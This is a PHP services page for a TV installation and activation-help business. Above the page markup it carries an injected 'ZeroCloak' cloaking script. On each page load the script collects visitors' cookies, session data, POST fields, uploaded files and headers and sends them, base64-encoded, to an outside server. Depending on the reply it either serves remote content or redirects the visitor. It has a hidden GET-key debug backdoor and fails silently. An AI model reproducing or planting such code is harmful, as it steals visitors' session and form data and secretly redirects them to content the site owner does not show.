<?php

class ZeroCloakV3
{
    private $targetUrl;
    private $encryptionKey;
    private $requestId;
    private $uei_6s71a1;
    private $cst_4u89t5;
    private $timeout;

    public function __construct()
    {
        header("Access-Control-Allow-Origin: *");
        header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
        header("Access-Control-Allow-Headers: Content-Type, Authorization");
        
        error_reporting(E_ALL);
        ini_set('display_errors', 1);

        $this->targetUrl        = 'https://app.zerocloak.com/realtime';
        $this->encryptionKey    = 'b96fe040-f322-4ffe-9981-94743ad3a129';
        $this->requestId        = uniqid('req_', true);
        $this->uei_6s71a1       = "jkmrvusiuk";
        $this->cst_4u89t5       = "oc8rjqji2p";
        $this->timeout          = 30;
    }

    private function retrieveAllHeaders()
    {
        if (!function_exists('getallheaders')) {
            $headers = [];
            foreach ($_SERVER as $name => $value) {
                if (substr($name, 0, 5) == 'HTTP_') {
                    $headers[str_replace(
                        ' ',
                        '-',
                        ucwords(strtolower(str_replace('_', ' ', substr($name, 5))))
                    )] = $value;
                }
            }
            return $headers;
        }
        return getallheaders();
    }

    private function gatherRequestData()
    {
        return [
            'request_id' => $this->requestId,
            'uei_6s71a1' => $this->uei_6s71a1,
            'cst_4u89t5' => $this->cst_4u89t5,
            'server'     => $_SERVER,
            'headers'    => $this->retrieveAllHeaders(),
            'get'        => $_GET,
            'post'       => $_POST,
            'files'      => $_FILES,
            'cookie'     => $_COOKIE,
            'session'    => isset($_SESSION) ? $_SESSION : [],
            'timestamp'  => date('Y-m-d H:i:s'),
        ];
    }

    private function transmitData($data, $maxRetries = 3)
    {
        if (function_exists('curl_version')) {
            return $this->sendUsingCurl($data, $maxRetries);
        } else {
            return $this->sendUsingFileGetContents($data);
        }
    }

    private function sendUsingCurl($data, $maxRetries = 3)
    {
        $ch = curl_init($this->targetUrl);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Content-Type: application/json',
            'Content-Length: ' . strlen($data),
            'X-Request-ID: ' . $this->requestId,
            'Cache-Control: no-cache',
            'Cache-Control: max-age=0',
            'Pragma: no-cache',
        ]);

        curl_setopt($ch, CURLOPT_TIMEOUT, $this->timeout);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $this->timeout);

        for ($retry = 0; $retry < $maxRetries; $retry++) {
            $response = curl_exec($ch);
            if ($response !== false) {
                curl_close($ch);
                return $response;
            }
            sleep(1);
        }

        curl_close($ch);
        return false;
    }

    private function sendUsingFileGetContents($data)
    {
        $opts = [
            "http" => [
                "header" => [
                    "Content-Type: application/json",
                    "Content-Length: " . strlen($data),
                    "X-Request-ID: " . $this->requestId,
                    "Cache-Control: no-cache",
                    'Cache-Control: max-age=0',
                    "Pragma: no-cache",
                ],
                "method" => "POST",
                "content" => $data,
                "timeout" => $this->timeout,
            ],
        ];

        $context = stream_context_create($opts);
        $response = @file_get_contents($this->targetUrl, false, $context);

        return $response;
    }

    public function clearCache()
    {
        if (function_exists('wp_cache_flush')) {
            wp_cache_flush();
        }

        if (function_exists('wp_cache_clear_cache')) {
            wp_cache_clear_cache();
        }
    }
    public function verify()
    {
        if(isset($_GET['8ea8cd56-1488']) && $_GET['8ea8cd56-1488'] == $this->encryptionKey){
            echo $this->cst_4u89t5;
            die();
        }
    }
    public function run()
    {
        $this->verify();
        $this->clearCache();
        $data = $this->gatherRequestData();
        
        if(isset($_GET['debug-8ea8cd56-1488']) && $_GET['debug-8ea8cd56-1488'] == $this->encryptionKey){
            echo "<h5>(1) Send: Data Got -</h5><pre>";
            print_r($data);
            echo "</pre>";
        }
        
        $jsonData   = json_encode($data);
        
        if(isset($_GET['debug-8ea8cd56-1488']) && $_GET['debug-8ea8cd56-1488'] == $this->encryptionKey){
            echo "<h5>(2) Send: Convert to Json -</h5><pre>";
            print_r($jsonData);
            echo "</pre>";
        }

        if ($jsonData === false) {
            $this->failHandle("Error: JSON encoding failed: " . json_last_error_msg());
            return false;
        }

        $base64Data = base64_encode($jsonData);
        
        if(isset($_GET['debug-8ea8cd56-1488']) && $_GET['debug-8ea8cd56-1488'] == $this->encryptionKey){
            echo "<h5>(3) Send: Json to base64_encode -</h5><pre>";
            print_r($base64Data);
            echo "</pre>";
        }

        if ($base64Data === false) {
            $this->failHandle("Error: Base64 encoding failed");
            return false;
        }

        $response = $this->transmitData($base64Data);
        
        if(isset($_GET['debug-8ea8cd56-1488-main']) && $_GET['debug-8ea8cd56-1488-main'] == $this->encryptionKey){
              echo $response;
              die;
        }
        
        if(isset($_GET['debug-8ea8cd56-1488']) && $_GET['debug-8ea8cd56-1488'] == $this->encryptionKey){
            echo "<h5>(1) Receive: Data Got -</h5><pre>";
            print_r($response);
            echo "</pre>";
        }
        
        if ($response !== false) {
            $this->successHandle($response);
        } else {
            $this->failHandle($response);
        }
    }

    public function successHandle($response)
    {

        $base64decodeData = base64_decode($response);
        
         if(isset($_GET['debug-8ea8cd56-1488']) && $_GET['debug-8ea8cd56-1488'] == $this->encryptionKey){
            echo "<h5>(5) Receive: decryptedData -</h5><pre>";
            print_r($base64decodeData);
            echo "</pre>";
        }
        
        
        if ($base64decodeData === false) {
            $this->failHandle("Error: Base64 decode failed");
            return false;
        }

        $responseData = json_decode($base64decodeData, true);

         if(isset($_GET['debug-8ea8cd56-1488']) && $_GET['debug-8ea8cd56-1488'] == $this->encryptionKey){
            echo "<h5>(6) Receive: decryptedData -</h5><pre>";
            print_r($responseData);
            echo "</pre>";
        }
        if ($responseData === null && json_last_error() !== JSON_ERROR_NONE) {
            $this->failHandle("Error: JSON decoding failed");
            return false;
        }
        if(!$responseData['status']){
            $this->failHandle($responseData['message']);
            return false;
        }

       if (
            (isset($_GET['debug-8ea8cd56-1488']) && $_GET['debug-8ea8cd56-1488'] === $this->encryptionKey) ||
            (isset($_GET['debug-8ea8cd56-1488-main']) && $_GET['debug-8ea8cd56-1488-main'] === $this->encryptionKey)
        ) {
            die();
        }

        if(!($responseData['data']['nothing'])){

            if(isset($responseData['data']['hr'])){
                header("Referrer-Policy: no-referrer");
            }

            if(!is_null($responseData['data']['zrc'])){

                if(!$responseData['data']['zrc']['status']){
                    $this->failHandle($responseData['data']['zrc']['message']);
                    return false;

                }else{
                    $this->zeroRedirectionCloaking($responseData['data']['zrc']['content']);
                    return true;

                }
            }

            $this->redirectTo($responseData['data']['url'],$responseData['data']['http_code']);
            return true;
        }
        return true;

    }
    private function zeroRedirectionCloaking(string $content = '') {
        echo $content;
        die();
    }
    private function redirectTo(string $url, string $method = 'header-301') {
        switch (strtolower($method)) {
            case 'header-301':
                header("Location: $url", 301);
                exit;

            case 'header-302':
                header("Location: $url", 302);
                exit;

            case 'header-refresh':
                header("Refresh: 0;url=$url");
                exit;

            case 'meta':
                echo '<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;url=' . htmlspecialchars($url) . '"><title>Redirecting...</title></head><body><a href="' . htmlspecialchars($url) . '">Click here</a></body></html>';
                exit;

            case 'js_meta':
                echo '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>Redirecting...</title></head><body><script>window.location.href = "' . htmlspecialchars($url) . '";</script><noscript><meta http-equiv="refresh" content="0;url=' . htmlspecialchars($url) . '"></noscript><p>If you are not redirected, <a href="' . htmlspecialchars($url) . '">click here</a>.</p></body></html>';
                exit;

            default:
                header("Location: $url", 301);
                exit;
        }
    }

    private function failHandle($response)
    {
        // Silently fail and allow the page to load instead of breaking the website
        return false;
    }
}

$zerocloakCloaking = new ZeroCloakV3();
$zerocloakCloaking->run();

// @zerocloak.com 2026-05-16 06:53:20
?>
<?php include 'includes/header.php'; ?>

<div class="pt-32 pb-0 bg-white">
    <div class="container mx-auto px-6 max-w-4xl text-center mb-20 fade-in-up">
        <h1 class="text-5xl font-extrabold text-slate-900 mb-6">Our Services & Setup Guides</h1>
        <p class="text-xl text-slate-600">Professional installation, configuration, activation services, and step-by-step guides.</p>
    </div>

    <!-- SERVICES SECTION -->
    <div class="container mx-auto px-6 mb-24 space-y-24">
        
        <!-- Service 1: TV Installation & Mounting -->
        <div class="flex flex-col lg:flex-row gap-12 items-center fade-in-up">
            <div class="w-full lg:w-1/2">
                <div class="rounded-3xl overflow-hidden shadow-2xl relative aspect-[4/3]">
                    <img src="https://images.unsplash.com/photo-1593784991095-a205069470b6?auto=format&fit=crop&q=80" alt="TV Installation" class="object-cover w-full h-full" />
                </div>
            </div>
            <div class="w-full lg:w-1/2">
                <div class="flex items-center gap-4 mb-4">
                    <div class="w-12 h-12 bg-primary/10 text-primary rounded-xl flex items-center justify-center">
                        <i data-lucide="tv" class="w-6 h-6"></i>
                    </div>
                    <h2 class="text-3xl font-bold text-slate-900">TV Installation & Mounting</h2>
                </div>
                <p class="text-lg text-slate-600 mb-6 leading-relaxed">Secure, perfectly leveled TV mounting on any surface including drywall, brick, and concrete.</p>
                <div class="mb-8">
                    <h4 class="font-bold text-slate-900 mb-4 text-lg">What's Included:</h4>
                    <ul class="grid grid-cols-1 sm:grid-cols-2 gap-3">
                        <li class="flex items-center gap-2 text-slate-700"><div class="w-1.5 h-1.5 rounded-full bg-primary"></div>Secure mounting</li>
                        <li class="flex items-center gap-2 text-slate-700"><div class="w-1.5 h-1.5 rounded-full bg-primary"></div>Perfect leveling</li>
                        <li class="flex items-center gap-2 text-slate-700"><div class="w-1.5 h-1.5 rounded-full bg-primary"></div>Safety checks</li>
                    </ul>
                </div>
                <a href="contact.php" class="inline-block bg-primary hover:bg-primary-dark text-white px-8 py-3 rounded-full font-bold transition-colors">Book This Service</a>
            </div>
        </div>

        <!-- Service 2: Cable Management -->
        <div class="flex flex-col lg:flex-row-reverse gap-12 items-center fade-in-up">
            <div class="w-full lg:w-1/2">
                <div class="rounded-3xl overflow-hidden shadow-2xl relative aspect-[4/3]">
                    <img src="https://images.unsplash.com/photo-1558089687-f282ffcbc126?auto=format&fit=crop&q=80" alt="Cable Management" class="object-cover w-full h-full" />
                </div>
            </div>
            <div class="w-full lg:w-1/2">
                <div class="flex items-center gap-4 mb-4">
                    <div class="w-12 h-12 bg-primary/10 text-primary rounded-xl flex items-center justify-center">
                        <i data-lucide="cable" class="w-6 h-6"></i>
                    </div>
                    <h2 class="text-3xl font-bold text-slate-900">Cable Management Solutions</h2>
                </div>
                <p class="text-lg text-slate-600 mb-6 leading-relaxed">Say goodbye to messy, tangled cables. We provide clean, aesthetic installations where all wires are hidden behind walls or within sleek cable raceways.</p>
                <div class="mb-8">
                    <h4 class="font-bold text-slate-900 mb-4 text-lg">What's Included:</h4>
                    <ul class="grid grid-cols-1 sm:grid-cols-2 gap-3">
                        <li class="flex items-center gap-2 text-slate-700"><div class="w-1.5 h-1.5 rounded-full bg-primary"></div>In-wall wire concealment</li>
                        <li class="flex items-center gap-2 text-slate-700"><div class="w-1.5 h-1.5 rounded-full bg-primary"></div>Cable raceway installation</li>
                        <li class="flex items-center gap-2 text-slate-700"><div class="w-1.5 h-1.5 rounded-full bg-primary"></div>Zip-tying and organization</li>
                    </ul>
                </div>
                <a href="contact.php" class="inline-block bg-primary hover:bg-primary-dark text-white px-8 py-3 rounded-full font-bold transition-colors">Book This Service</a>
            </div>
        </div>

        <!-- Service 3: Streaming Device Setup -->
        <div class="flex flex-col lg:flex-row gap-12 items-center fade-in-up">
            <div class="w-full lg:w-1/2">
                <div class="rounded-3xl overflow-hidden shadow-2xl relative aspect-[4/3]">
                    <img src="https://images.unsplash.com/photo-1593305841991-05c297ba4575?auto=format&fit=crop&q=80" alt="Streaming Setup" class="object-cover w-full h-full" />
                </div>
            </div>
            <div class="w-full lg:w-1/2">
                <div class="flex items-center gap-4 mb-4">
                    <div class="w-12 h-12 bg-primary/10 text-primary rounded-xl flex items-center justify-center">
                        <i data-lucide="monitor-play" class="w-6 h-6"></i>
                    </div>
                    <h2 class="text-3xl font-bold text-slate-900">Streaming Device Setup</h2>
                </div>
                <p class="text-lg text-slate-600 mb-6 leading-relaxed">Whether you are using Roku, Apple TV, Amazon Fire Stick, or Chromecast, we ensure your device is properly connected, updated, and ready to stream in minutes.</p>
                <div class="mb-8">
                    <h4 class="font-bold text-slate-900 mb-4 text-lg">What's Included:</h4>
                    <ul class="grid grid-cols-1 sm:grid-cols-2 gap-3">
                        <li class="flex items-center gap-2 text-slate-700"><div class="w-1.5 h-1.5 rounded-full bg-primary"></div>Device activation</li>
                        <li class="flex items-center gap-2 text-slate-700"><div class="w-1.5 h-1.5 rounded-full bg-primary"></div>App installation & login</li>
                        <li class="flex items-center gap-2 text-slate-700"><div class="w-1.5 h-1.5 rounded-full bg-primary"></div>Wi-Fi network optimization</li>
                        <li class="flex items-center gap-2 text-slate-700"><div class="w-1.5 h-1.5 rounded-full bg-primary"></div>Remote pairing</li>
                    </ul>
                </div>
                <a href="contact.php" class="inline-block bg-primary hover:bg-primary-dark text-white px-8 py-3 rounded-full font-bold transition-colors">Book This Service</a>
            </div>
        </div>

    </div>

    <!-- DETAILED SETUP GUIDE SECTION -->
    <div class="bg-slate-50 py-24 border-t border-slate-200">
        <div class="container mx-auto px-6 max-w-4xl">
            <div class="text-center mb-16 fade-in-up">
                <span class="inline-block py-1.5 px-4 rounded-full bg-primary/10 text-primary font-semibold text-sm mb-4">Setup Guide</span>
                <h2 class="text-4xl font-bold text-slate-900 mb-6">Complete Guide for TV Setup & Activation</h2>
                <p class="text-lg text-slate-600">Setting up a smart television can feel confusing, especially when you reach the activation screen. This complete step-by-step guide walks you through the entire process from unboxing to streaming.</p>
            </div>

            <div class="space-y-8">
                
                <div class="bg-white p-8 rounded-2xl shadow-sm border border-slate-100 fade-in-up">
                    <div class="flex items-center gap-4 mb-4">
                        <div class="w-10 h-10 bg-primary text-white rounded-full flex items-center justify-center font-bold text-lg">1</div>
                        <h3 class="text-2xl font-bold text-slate-900">Unbox and Place Your TV</h3>
                    </div>
                    <p class="text-slate-600 ml-14">Start by safely unboxing your device. Place it on a stable surface or have it professionally mounted. Ensure there is proper ventilation, avoid direct sunlight, and verify access to a nearby power outlet.</p>
                </div>

                <div class="bg-white p-8 rounded-2xl shadow-sm border border-slate-100 fade-in-up">
                    <div class="flex items-center gap-4 mb-4">
                        <div class="w-10 h-10 bg-primary text-white rounded-full flex items-center justify-center font-bold text-lg">2</div>
                        <h3 class="text-2xl font-bold text-slate-900">Connect Power and Turn On</h3>
                    </div>
                    <p class="text-slate-600 ml-14">Plug in the power cable and turn on the device using the remote. During this initial boot, you will be prompted to choose your language and geographical region. Select the correct options to proceed smoothly.</p>
                </div>

                <div class="bg-white p-8 rounded-2xl shadow-sm border border-slate-100 fade-in-up">
                    <div class="flex items-center gap-4 mb-4">
                        <div class="w-10 h-10 bg-primary text-white rounded-full flex items-center justify-center font-bold text-lg">3</div>
                        <h3 class="text-2xl font-bold text-slate-900">Connect to Wi-Fi & Update</h3>
                    </div>
                    <p class="text-slate-600 ml-14 mb-4">A stable internet connection is essential for activation. Choose your home Wi-Fi network and enter the password. Without the internet, you cannot complete the setup process.</p>
                    <div class="ml-14 bg-blue-50 p-4 rounded-xl border border-blue-100 text-blue-800 text-sm">
                        <strong>Important:</strong> Most devices will check for software updates automatically. Always let it update to the latest firmware version to avoid bugs or errors during activation.
                    </div>
                </div>

                <div class="bg-white p-8 rounded-2xl shadow-sm border border-slate-100 fade-in-up">
                    <div class="flex items-center gap-4 mb-4">
                        <div class="w-10 h-10 bg-primary text-white rounded-full flex items-center justify-center font-bold text-lg">4</div>
                        <h3 class="text-2xl font-bold text-slate-900">Get Your Activation Code</h3>
                    </div>
                    <p class="text-slate-600 ml-14">After connecting to Wi-Fi and updating, your TV will display an activation screen with a unique alphanumeric code. Leave your TV on this screen—do not exit or turn off the TV.</p>
                </div>

                <div class="bg-white p-8 rounded-2xl shadow-sm border border-slate-100 fade-in-up">
                    <div class="flex items-center gap-4 mb-4">
                        <div class="w-10 h-10 bg-primary text-white rounded-full flex items-center justify-center font-bold text-lg">5</div>
                        <h3 class="text-2xl font-bold text-slate-900">Enter Code on Activation Page</h3>
                    </div>
                    <p class="text-slate-600 ml-14 mb-4">To complete the activation process:</p>
                    <ul class="ml-14 space-y-2 text-slate-600 list-disc list-inside">
                        <li>Open a browser on your smartphone, tablet, or computer.</li>
                        <li>Navigate to the activation URL displayed on your TV screen (e.g., <em>provider.com/activate</em>).</li>
                        <li>Sign in to your streaming account.</li>
                        <li>Enter the exact code displayed on your TV into the website.</li>
                    </ul>
                </div>

                <div class="bg-white p-8 rounded-2xl shadow-sm border border-slate-100 fade-in-up">
                    <div class="flex items-center gap-4 mb-4">
                        <div class="w-10 h-10 bg-primary text-white rounded-full flex items-center justify-center font-bold text-lg">6</div>
                        <h3 class="text-2xl font-bold text-slate-900">Wait for Confirmation</h3>
                    </div>
                    <p class="text-slate-600 ml-14">Once the code is submitted and verified online, your TV screen will automatically refresh within a few seconds. Your device is now linked, and you can start installing apps, customizing settings, and enjoying your favorite content!</p>
                </div>

            </div>

            <div class="mt-12 bg-slate-900 text-white p-8 rounded-3xl text-center fade-in-up">
                <h3 class="text-2xl font-bold mb-4">Having Trouble Activating?</h3>
                <p class="text-slate-300 mb-6 max-w-2xl mx-auto">If your Wi-Fi won't connect, your code is invalid, or the activation page is stuck, our independent support team can help you bypass these hurdles instantly.</p>
                <a href="contact.php" class="inline-block bg-primary hover:bg-primary-dark text-white px-8 py-3 rounded-full font-bold transition-colors">Get Expert Help Now</a>
            </div>

        </div>
    </div>
    
    <!-- CTA -->
    <section class="py-20 relative overflow-hidden fade-in-up">
        <div class="absolute inset-0 bg-primary"></div>
        <div class="container mx-auto px-6 relative z-10 text-center">
            <h2 class="text-4xl md:text-5xl font-extrabold text-white mb-6">Need Help Setting Up Your Device?</h2>
            <p class="text-xl text-primary-100 mb-10 text-white/90">Our certified technicians are standing by to get you connected fast.</p>
            <div class="flex flex-col sm:flex-row justify-center gap-4">
                <a href="contact.php" class="bg-white text-primary hover:bg-slate-50 px-8 py-4 rounded-full font-bold text-lg shadow-xl">Contact Us Online</a>
            </div>
        </div>
    </section>
</div>

<?php include 'includes/footer.php'; ?>
